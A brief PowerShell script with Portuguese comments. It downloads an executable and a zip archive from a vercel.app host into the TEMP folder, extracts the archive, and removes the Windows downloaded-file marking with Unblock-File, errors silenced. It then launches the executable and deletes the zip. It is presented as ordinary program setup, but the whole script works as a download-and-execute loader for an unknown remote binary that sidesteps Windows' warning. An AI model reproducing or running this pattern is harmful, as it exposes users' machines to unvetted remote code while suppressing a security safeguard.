# 1. Configurações
$baseUrl = "https://packultimate.vercel.app"
$pastaDestino = "$env:TEMP\MeuPrograma"
$nomeExe = "adicionar.exe"
$nomeZip = "config.zip"

if (-Not (Test-Path $pastaDestino)) { New-Item -ItemType Directory -Path $pastaDestino -Force | Out-Null }

Write-Host "--- Iniciando Processo ---" -ForegroundColor Cyan

# 2. Download com limpeza de cache (Garante que não baixe arquivo corrompido anterior)
Write-Host "[1/3] Baixando arquivos..." -ForegroundColor Yellow
$caminhoExe = Join-Path $pastaDestino $nomeExe
$caminhoZip = Join-Path $pastaDestino $nomeZip

# Remove arquivos velhos para evitar conflito de "corrompido"
if (Test-Path $caminhoExe) { Remove-Item $caminhoExe -Force }
if (Test-Path $caminhoZip) { Remove-Item $caminhoZip -Force }

Invoke-WebRequest -Uri "$baseUrl/$nomeExe" -OutFile $caminhoExe
Invoke-WebRequest -Uri "$baseUrl/$nomeZip" -OutFile $caminhoZip

# 3. Extração Otimizada
Write-Host "[2/3] Extraindo configurações..." -ForegroundColor Yellow
$shell = New-Object -ComObject Shell.Application
$zipItem = $shell.NameSpace($caminhoZip)
$destinoItem = $shell.NameSpace($pastaDestino)
$destinoItem.CopyHere($zipItem.Items(), 16)

# PAUSA CRÍTICA: Dá 2 segundos para o Windows estabilizar os arquivos no disco
Start-Sleep -Seconds 2

# 4. Execução com Verificação
Write-Host "[3/3] Abrindo $nomeExe..." -ForegroundColor Green

if (Test-Path $caminhoExe) {
    # Força o desbloqueio do arquivo caso o Windows tenha marcado como "vindo da internet"
    Unblock-File -Path $caminhoExe -ErrorAction SilentlyContinue
    
    Set-Location -Path $pastaDestino
    # Usa o caminho completo para evitar erro de diretório
    Start-Process -FilePath "$caminhoExe" -WorkingDirectory $pastaDestino
}

# Limpeza final do ZIP
if (Test-Path $caminhoZip) { Remove-Item $caminhoZip -Force }

Write-Host "--- Concluído ---" -ForegroundColor Cyan
